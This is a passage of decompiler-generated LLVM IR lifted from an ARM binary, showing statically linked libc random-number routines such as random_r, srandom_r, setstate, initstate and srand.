  %v2_f7c8 = ptrtoint i32* %stack_var_-20 to i32
  %v0_f7cc = load i32, i32* @r4, align 4
  %v2_f7cc = add i32 %v0_f7cc, 740
  %v2_f7d0 = inttoptr i32 %v2_f7cc to i32*
  %v3_f7d0 = call i32 @__GI_random_r(i32* %v2_f7d0, i32 %v2_f7c8)
  %v0_f7e0 = load i32, i32* @r4, align 4
  %v2_f7e0 = add i32 %v0_f7e0, 48
  %v3_f7e0 = inttoptr i32 %v2_f7e0 to i32*
  %v4_f7e0 = load i32, i32* %v3_f7e0, align 4
  call void @__pseudo_branch(i32 %v4_f7e0)
  %v3_f7ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_f774, i32* @r4, align 4
  ret i32 %v3_f7ec
}

define i32 @function_f800(i32 %arg1) local_unnamed_addr {
dec_label_pc_f800:
  %v0_f800 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f800, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f800
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f800, %bb
  %v10_f814 = phi i32 [ %arg1, %dec_label_pc_f800 ], [ 0, %bb ]
  ret i32 %v10_f814

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_f848 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f848)
  %v0_f85c = load i32, i32* @r6, align 4
  %v2_f85c = add i32 %v0_f85c, 16
  %v3_f85c = inttoptr i32 %v2_f85c to i32*
  %v4_f85c = load i32, i32* %v3_f85c, align 4
  call void @__pseudo_branch(i32 %v4_f85c)
  %v0_f86c = load i32, i32* @r6, align 4
  %v2_f86c = add i32 %v0_f86c, 740
  %v0_f874 = load i32, i32* @r5, align 4
  %v1_f878 = add i32 %v0_f86c, 748
  %v2_f878 = inttoptr i32 %v1_f878 to i32*
  %v3_f878 = load i32, i32* %v2_f878, align 4
  store i32 %v3_f878, i32* @r4, align 4
  %v2_f87c = inttoptr i32 %v2_f86c to i32*
  %v3_f87c = call i32 @setstate_r(i32 %v0_f874, i32* %v2_f87c)
  %v1_f884 = icmp slt i32 %v3_f87c, 0
  %v3_f894 = load i32, i32* @r4, align 4
  %v4_f894 = add i32 %v3_f894, -4
  %storemerge = select i1 %v1_f884, i32 0, i32 %v4_f894
  %v0_f898 = load i32, i32* @r6, align 4
  %v2_f898 = add i32 %v0_f898, 48
  %v3_f898 = inttoptr i32 %v2_f898 to i32*
  %v4_f898 = load i32, i32* %v3_f898, align 4
  call void @__pseudo_branch(i32 %v4_f898)
  ret i32 %storemerge
}

define i32 @function_f8b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f8b8:
  %v0_f8b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f8b8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f8b8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f8b8, %bb
  %v10_f8cc = phi i32 [ %arg1, %dec_label_pc_f8b8 ], [ 0, %bb ]
  ret i32 %v10_f8cc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_f908 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f908)
  %v0_f91c = load i32, i32* @r4, align 4
  %v2_f91c = add i32 %v0_f91c, 16
  %v3_f91c = inttoptr i32 %v2_f91c to i32*
  %v4_f91c = load i32, i32* %v3_f91c, align 4
  call void @__pseudo_branch(i32 %v4_f91c)
  %v0_f92c = load i32, i32* @r6, align 4
  %v0_f930 = load i32, i32* @r4, align 4
  %v2_f930 = add i32 %v0_f930, 740
  %v0_f934 = load i32, i32* @r7, align 4
  %v0_f938 = load i32, i32* @sl, align 4
  store i32 %v0_f938, i32* @r0, align 4
  %v1_f93c = add i32 %v0_f930, 748
  %v2_f93c = inttoptr i32 %v1_f93c to i32*
  %v3_f93c = load i32, i32* %v2_f93c, align 4
  store i32 %v3_f93c, i32* @r5, align 4
  %v4_f940 = inttoptr i32 %v0_f938 to i32*
  %v5_f940 = call i32 @__GI_initstate_r(i32* %v4_f940, i32 %v0_f92c, i32 %v0_f934, i32 %v2_f930)
  %v0_f950 = load i32, i32* @r4, align 4
  %v2_f950 = add i32 %v0_f950, 48
  %v3_f950 = inttoptr i32 %v2_f950 to i32*
  %v4_f950 = load i32, i32* %v3_f950, align 4
  call void @__pseudo_branch(i32 %v4_f950)
  %v0_f95c = load i32, i32* @r5, align 4
  %v1_f95c = add i32 %v0_f95c, -4
  ret i32 %v1_f95c
}

define i32 @function_f978(i32 %arg1) local_unnamed_addr {
dec_label_pc_f978:
  %v0_f978 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f978, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f978
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f978, %bb
  %v10_f98c = phi i32 [ %arg1, %dec_label_pc_f978 ], [ 0, %bb ]
  ret i32 %v10_f98c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_f990 = load i32, i32* @r4, align 4
  %v6_f990 = load i32, i32* @r5, align 4
  %v9_f990 = load i32, i32* @r6, align 4
  %v15_f990 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  %v2_f9a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 588), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_f9c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f9c0)
  %v0_f9d4 = load i32, i32* @r4, align 4
  %v2_f9d4 = add i32 %v0_f9d4, 16
  %v3_f9d4 = inttoptr i32 %v2_f9d4 to i32*
  %v4_f9d4 = load i32, i32* %v3_f9d4, align 4
  call void @__pseudo_branch(i32 %v4_f9d4)
  %v0_f9e4 = load i32, i32* @r6, align 4
  store i32 %v0_f9e4, i32* @r0, align 4
  %v0_f9e8 = load i32, i32* @r4, align 4
  %v2_f9e8 = add i32 %v0_f9e8, 740
  %v2_f9ec = inttoptr i32 %v0_f9e4 to i32*
  %v3_f9ec = call i32 @srandom_r(i32* %v2_f9ec, i32 %v2_f9e8)
  %v0_fa00 = load i32, i32* @r4, align 4
  %v2_fa00 = add i32 %v0_fa00, 48
  %v3_fa00 = inttoptr i32 %v2_fa00 to i32*
  %v4_fa00 = load i32, i32* %v3_fa00, align 4
  call void @__pseudo_branch(i32 %v4_fa00)
  store i32 %v3_f990, i32* @r4, align 4
  store i32 %v6_f990, i32* @r5, align 4
  store i32 %v9_f990, i32* @r6, align 4
  store i32 %v15_f990, i32* @lr, align 4
  ret i32 %v2_f9a4
}

define i32 @function_fa1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa1c:
  %v0_fa1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fa1c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_fa1c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fa1c, %bb
  %v10_fa30 = phi i32 [ %arg1, %dec_label_pc_fa1c ], [ 0, %bb ]
  ret i32 %v10_fa30

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa34 = load i32, i32* @r4, align 4
  store i32 %v3_fa34, i32* %stack_var_-8, align 4
  %v1_fa38 = add i32 %tmp, 12
  %v2_fa38 = inttoptr i32 %v1_fa38 to i8*
  %v3_fa38 = load i8, i8* %v2_fa38, align 1
  %v4_fa38 = sext i8 %v3_fa38 to i32
  store i32 %v4_fa38, i32* %r3.global-to-local, align 4
  %v2_fa3c = icmp eq i8 %v3_fa38, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_fa48 = add i32 %tmp, 8
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  store i32 %v3_fa48, i32* %lr.global-to-local, align 4
  br i1 %v2_fa3c, label %dec_label_pc_fa50, label %dec_label_pc_fa74

dec_label_pc_fa50:                                ; preds = %entry
  %v1_fa50 = inttoptr i32 %v3_fa48 to i32*
  %v2_fa50 = load i32, i32* %v1_fa50, align 4
  store i32 %v2_fa50, i32* %r2.global-to-local, align 4
  %v2_fa58 = mul i32 %v2_fa50, 1103515245
  %v1_fa60 = add i32 %v2_fa58, 12345
  %tmp6 = bitcast i32 %v1_fa60 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_fa64 = bitcast float %tmp7 to i32
  store i32 %v1_fa64, i32* %r3.global-to-local, align 4
  store i32 %v1_fa64, i32* %v1_fa50, align 4
  %v0_fa6c = load i32, i32* %r3.global-to-local, align 4
  %v2_fa6c = inttoptr i32 %arg2 to i32*
  store i32 %v0_fa6c, i32* %v2_fa6c, align 4
  br label %dec_label_pc_fab4

dec_label_pc_fa74:                                ; preds = %entry
  %v2_fa74 = load i32, i32* %arg1, align 4
  store i32 %v2_fa74, i32* %r2.global-to-local, align 4
  %v1_fa78 = add i32 %tmp, 4
  %v2_fa78 = inttoptr i32 %v1_fa78 to i32*
  %v3_fa78 = load i32, i32* %v2_fa78, align 4
  store i32 %v3_fa78, i32* %r0.global-to-local, align 4
  %v1_fa7c = inttoptr i32 %v2_fa74 to i32*
  %v2_fa7c = load i32, i32* %v1_fa7c, align 4
  store i32 %v2_fa7c, i32* %r1.global-to-local, align 4
  %v1_fa80 = inttoptr i32 %v3_fa78 to i32*
  %v2_fa80 = load i32, i32* %v1_fa80, align 4
  %v4_fa80 = add i32 %v3_fa78, 4
  store i32 %v4_fa80, i32* %r0.global-to-local, align 4
  %v2_fa84 = add i32 %v2_fa80, %v2_fa7c
  store i32 %v2_fa84, i32* %r3.global-to-local, align 4
  store i32 %v2_fa84, i32* %v1_fa7c, align 4
  %v3_fa88 = load i32, i32* %r2.global-to-local, align 4
  %v4_fa88 = add i32 %v3_fa88, 4
  store i32 %v4_fa88, i32* %r2.global-to-local, align 4
  %v0_fa8c = load i32, i32* %ip.global-to-local, align 4
  %v1_fa8c = add i32 %v0_fa8c, 16
  %v2_fa8c = inttoptr i32 %v1_fa8c to i32*
  %v3_fa8c = load i32, i32* %v2_fa8c, align 4
  store i32 %v3_fa8c, i32* %r1.global-to-local, align 4
  %v0_fa90 = load i32, i32* %r3.global-to-local, align 4
  %v3_fa90 = udiv i32 %v0_fa90, 2
  store i32 %v3_fa90, i32* %r3.global-to-local, align 4
  %v3_fa94 = icmp ult i32 %v4_fa88, %v3_fa8c
  %v1_fa98 = load i32, i32* %r4.global-to-local, align 4
  %v2_fa98 = inttoptr i32 %v1_fa98 to i32*
  store i32 %v3_fa90, i32* %v2_fa98, align 4
  br i1 %v3_fa94, label %dec_label_pc_faa4, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_fa74
  %v1_fa9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_fa9c, i32* %r2.global-to-local, align 4
  %v0_faac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_faa4:                                ; preds = %dec_label_pc_fa74
  %v0_faa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_faa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_faa4 = icmp ult i32 %v0_faa4, %v1_faa4
  br i1 %v3_faa4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_faa4
  %v1_faa8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_faa8, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_faa4, %._crit_edge, %bb
  %v0_faac = phi i32 [ %v0_faac.pre, %._crit_edge ], [ %v0_faa4, %dec_label_pc_faa4 ], [ %v1_faa8, %bb ]
  %v1_faac = load i32, i32* %ip.global-to-local, align 4
  %v2_faac = add i32 %v1_faac, 4
  %v3_faac = inttoptr i32 %v2_faac to i32*
  store i32 %v0_faac, i32* %v3_faac, align 4
  %v0_fab0 = load i32, i32* %r2.global-to-local, align 4
  %v1_fab0 = load i32, i32* %ip.global-to-local, align 4
  %v2_fab0 = inttoptr i32 %v1_fab0 to i32*
  store i32 %v0_fab0, i32* %v2_fab0, align 4
  br label %dec_label_pc_fab4

dec_label_pc_fab4:                                ; preds = %dec_label_pc_fa50, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_fab8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fab8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_fa90, { 1, 0 }
  uselistorder i32 %v1_fa64, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_fab4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fac4 = load i32, i32* @r4, align 4
  store i32 %v3_fac4, i32* %stack_var_-36, align 4
  %v1_fac8 = add i32 %tmp, 12
  %v2_fac8 = inttoptr i32 %v1_fac8 to i8*
  %v3_fac8 = load i8, i8* %v2_fac8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_fad8 = load i8, i8* %v2_fac8, align 1
  %tmp33 = icmp ugt i8 %v3_fac8, 4
  br i1 %tmp33, label %.dec_label_pc_fb84_crit_edge, label %dec_label_pc_fae4

.dec_label_pc_fb84_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_fb84

dec_label_pc_fae4:                                ; preds = %entry
  %v0_fae4 = load i32, i32* @r0, align 4
  %v2_fae4 = icmp eq i32 %v0_fae4, 0
  %v1_fae8 = add i32 %tmp, 8
  %v2_fae8 = inttoptr i32 %v1_fae8 to i32*
  %v3_fae8 = load i32, i32* %v2_fae8, align 4
  store i32 %v3_fae8, i32* %r6.global-to-local, align 4
  br i1 %v2_fae4, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_fae4
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_fae4, %bb
  %v0_faf4 = phi i32 [ %v0_fae4, %dec_label_pc_fae4 ], [ 1, %bb ]
  %v2_faf0 = icmp eq i8 %v3_fad8, 0
  %v2_faf4 = inttoptr i32 %v3_fae8 to i32*
  store i32 %v0_faf4, i32* %v2_faf4, align 4
  br i1 %v2_faf0, label %dec_label_pc_fb80, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %bb23
  %v1_fafc = add i32 %tmp, 13
  %v2_fafc = inttoptr i32 %v1_fafc to i8*
  %v3_fafc = load i8, i8* %v2_fafc, align 1
  %v4_fafc = sext i8 %v3_fafc to i32
  store i32 %v4_fafc, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_fb08 = load i32, i32* @r0, align 4
  store i32 %v0_fb08, i32* %r4.global-to-local, align 4
  %v0_fb0c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fb0c, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_fb4c25 = icmp sgt i8 %v3_fafc, 1
  br i1 %v5_fb4c25, label %dec_label_pc_fb18, label %dec_label_pc_fb50

dec_label_pc_fb18:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge
  %v1_fb2c = phi i32 [ %v1_fb2c.pre, %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge ], [ 2836, %dec_label_pc_fafc ]
  %v1_fb20 = phi i32 [ %v1_fb20.pre, %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge ], [ 16807, %dec_label_pc_fafc ]
  %v0_fb1c27 = phi i32 [ %v0_fb40.pre, %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge ], [ %v0_fb08, %dec_label_pc_fafc ]
  %v1_fb3826 = phi i32 [ %v5_fb38, %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge ], [ %v0_fb0c, %dec_label_pc_fafc ]
  %v3_fb18 = urem i32 %v0_fb1c27, 127773
  %v2_fb20 = mul i32 %v1_fb20, %v3_fb18
  %v2_fb28 = sdiv i32 %v0_fb1c27, 127773
  %v2_fb2c = mul i32 %v1_fb2c, %v2_fb28
  %v2_fb30 = sub i32 %v2_fb20, %v2_fb2c
  %v8_fb30 = icmp slt i32 %v2_fb30, 0
  %v2_fb34 = add i32 %v2_fb30, 2147483647
  %v2_fb34.v2_fb30 = select i1 %v8_fb30, i32 %v2_fb34, i32 %v2_fb30
  store i32 %v2_fb34.v2_fb30, i32* %r4.global-to-local, align 4
  %v2_fb38 = add i32 %v1_fb3826, 4
  %v3_fb38 = inttoptr i32 %v2_fb38 to i32*
  store i32 %v2_fb34.v2_fb30, i32* %v3_fb38, align 4
  %v4_fb38 = load i32, i32* %r8.global-to-local, align 4
  %v5_fb38 = add i32 %v4_fb38, 4
  store i32 %v5_fb38, i32* %r8.global-to-local, align 4
  %v0_fb3c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_fb3c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_fb40.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fb48 = add i32 %v0_fb3c.pre, 1
  store i32 %v1_fb48, i32* %r7.global-to-local, align 4
  %v5_fb4c = icmp slt i32 %v0_fb3c.pre, %v1_fb3c.pre
  br i1 %v5_fb4c, label %dec_label_pc_fb18.dec_label_pc_fb18_crit_edge, label %dec_label_pc_fb3c.dec_label_pc_fb50_crit_edge

dec_label_pc_fb18.dec_label_pc_fb18_crit_edge:    ; preds = %dec_label_pc_fb18
  %v1_fb20.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_fb2c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_fb18

dec_label_pc_fb3c.dec_label_pc_fb50_crit_edge:    ; preds = %dec_label_pc_fb18
  %v0_fb60.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fb3c.dec_label_pc_fb50_crit_edge, %dec_label_pc_fafc
  %v0_fb60 = phi i32 [ %v0_fb60.pre, %dec_label_pc_fb3c.dec_label_pc_fb50_crit_edge ], [ %v0_fb0c, %dec_label_pc_fafc ]
  %v0_fb54.lcssa = phi i32 [ %v1_fb3c.pre, %dec_label_pc_fb3c.dec_label_pc_fb50_crit_edge ], [ %v4_fafc, %dec_label_pc_fafc ]
  %v2_fb54 = mul i32 %v0_fb54.lcssa, 10
  store i32 %v2_fb54, i32* @r4, align 4
  %v0_fb58 = load i32, i32* %r5.global-to-local, align 4
  %v1_fb58 = add i32 %v0_fb58, 14
  %v2_fb58 = inttoptr i32 %v1_fb58 to i8*
  %v3_fb58 = load i8, i8* %v2_fb58, align 1
  %v4_fb58 = sext i8 %v3_fb58 to i32
  %v2_fb5c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_fb5c, i32* %r7.global-to-local, align 4
  %v4_fb60 = mul nsw i32 %v4_fb58, 4
  %v5_fb60 = add i32 %v0_fb60, %v4_fb60
  %v1_fb64 = inttoptr i32 %v0_fb58 to i32*
  store i32 %v5_fb60, i32* %v1_fb64, align 4
  %v3_fb64 = add i32 %v0_fb58, 4
  %v4_fb64 = inttoptr i32 %v3_fb64 to i32*
  %v5_fb64 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_fb64, i32* %v4_fb64, align 4
  br label %dec_label_pc_fb70

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb70
  %v0_fb74 = load i32, i32* %r5.global-to-local, align 4
  %v2_fb6c = inttoptr i32 %v0_fb74 to i32*
  %v3_fb6c = call i32 @__GI_random_r(i32* %v2_fb6c, i32 %v2_fb5c)
  br label %dec_label_pc_fb70

dec_label_pc_fb70:                                ; preds = %dec_label_pc_fb50, %dec_label_pc_fb6c
  %v0_fb70 = load i32, i32* @r4, align 4
  %v1_fb70 = add i32 %v0_fb70, -1
  store i32 %v1_fb70, i32* @r4, align 4
  %v6_fb70 = icmp slt i32 %v1_fb70, 0
  br i1 %v6_fb70, label %dec_label_pc_fb80, label %dec_label_pc_fb6c

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb70, %bb23
  %v2_fb88.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %.dec_label_pc_fb84_crit_edge, %dec_label_pc_fb80
  %v2_fb88 = phi i32 [ %v3_fac4, %.dec_label_pc_fb84_crit_edge ], [ %v2_fb88.pre, %dec_label_pc_fb80 ]
  %v1_fb8c = phi i32 [ -1, %.dec_label_pc_fb84_crit_edge ], [ 0, %dec_label_pc_fb80 ]
  store i32 %v2_fb88, i32* @r4, align 4
  ret i32 %v1_fb8c

; uselistorder directives
  uselistorder i32 %v1_fb70, { 1, 0 }
  uselistorder i32 %v0_fb58, { 1, 0, 2 }
  uselistorder i32 %v0_fb3c.pre, { 1, 0 }
  uselistorder i32 %v5_fb38, { 1, 0 }
  uselistorder i32 %v0_fb1c27, { 1, 0 }
  uselistorder i32 %v0_fb0c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_fb84, { 1, 0 }
  uselistorder label %dec_label_pc_fb70, { 1, 0 }
  uselistorder label %dec_label_pc_fb18, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fb90:
  %v0_fb90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fb90, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_fb90
  %v2_fb90 = load i32, i32* @r7, align 4
  %v5_fb90 = udiv i32 %v2_fb90, 8
  %v6_fb90 = and i32 %v5_fb90, %arg1
  %v3_fb94 = load i32, i32* @fp, align 4
  %v8_fb94 = shl i32 %v6_fb90, %v3_fb94
  %v9_fb94 = and i32 %v8_fb94, %arg1
  %v2_fb98 = load i32, i32* @sp, align 4
  %v8_fb98 = shl i32 %v2_fb98, %arg3
  %v9_fb98 = and i32 %v8_fb98, %arg2
  call void @__pseudo_branch(i32 %v9_fb98)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fb90, %bb
  %v10_fb98 = phi i32 [ %arg1, %dec_label_pc_fb90 ], [ %v9_fb94, %bb ]
  ret i32 %v10_fb98

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_fb9c = load i32, i32* @r4, align 4
  %v6_fb9c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_fbcc, label %dec_label_pc_fbbc

dec_label_pc_fbbc:                                ; preds = %entry
  %v2_fbbc = icmp ugt i32 %arg2, 254
  %v7_fbbc = icmp eq i32 %arg2, 255
  %v2_fbc0 = xor i1 %v7_fbbc, true
  %v3_fbc0 = and i1 %v2_fbbc, %v2_fbc0
  br i1 %v3_fbc0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_fbbc
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_fbbc, %bb
  %v1_fbf87 = phi i32 [ %v3_fb9c, %dec_label_pc_fbbc ], [ 4, %bb ]
  %v2_fbc4 = xor i1 %v2_fbbc, true
  %v3_fbc4 = or i1 %v7_fbbc, %v2_fbc4
  br i1 %v3_fbc4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_fbcc:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_fbe4, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fbcc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_fc54

.thread10:                                        ; preds = %dec_label_pc_fbd4
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbcc
  %v2_fbe4 = icmp ugt i32 %arg2, 62
  %v7_fbe4 = icmp eq i32 %arg2, 63
  %v2_fbe8 = xor i1 %v7_fbe4, true
  %v3_fbe8 = and i1 %v2_fbe4, %v2_fbe8
  br i1 %v3_fbe8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_fbe4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_fbe4, %bb23
  %v1_fbf86 = phi i32 [ %v3_fb9c, %dec_label_pc_fbe4 ], [ 2, %bb23 ]
  %v2_fbec = xor i1 %v2_fbe4, true
  %v3_fbec = or i1 %v7_fbe4, %v2_fbec
  br i1 %v3_fbec, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_fc04 = phi i32 [ 3, %bb22 ], [ %v1_fbf87, %bb21 ], [ %v1_fbf86, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35048), i32* %r3.global-to-local, align 4
  %v4_fbf8 = mul i32 %v1_fc04, 4
  %v5_fbf8 = add i32 %v4_fbf8, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35048)
  store i32 %v5_fbf8, i32* %r2.global-to-local, align 4
  %v1_fbfc = add i32 %v4_fbf8, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35028)
  %v2_fbfc = inttoptr i32 %v1_fbfc to i32*
  %v3_fbfc = load i32, i32* %v2_fbfc, align 4
  store i32 %v3_fbfc, i32* %r1.global-to-local, align 4
  %v1_fc00 = add i32 %tmp, 4
  store i32 %v1_fc00, i32* @r6, align 4
  %v6_fc04 = inttoptr i32 %v5_fbf8 to i32*
  %v7_fc04 = load i32, i32* %v6_fc04, align 4
  store i32 %v7_fc04, i32* %r2.global-to-local, align 4
  %v4_fc08 = mul i32 %v3_fbfc, 4
  %v5_fc08 = add i32 %v4_fc08, %v1_fc00
  store i32 %v5_fc08, i32* %r3.global-to-local, align 4
  %v2_fc0c = add i32 %arg3, 16
  %v3_fc0c = inttoptr i32 %v2_fc0c to i32*
  store i32 %v5_fc08, i32* %v3_fc0c, align 4
  %v0_fc10 = load i32, i32* %r2.global-to-local, align 4
  %v1_fc10 = trunc i32 %v0_fc10 to i8
  %v2_fc10 = load i32, i32* @r5, align 4
  %v3_fc10 = add i32 %v2_fc10, 14
  %v4_fc10 = inttoptr i32 %v3_fc10 to i8*
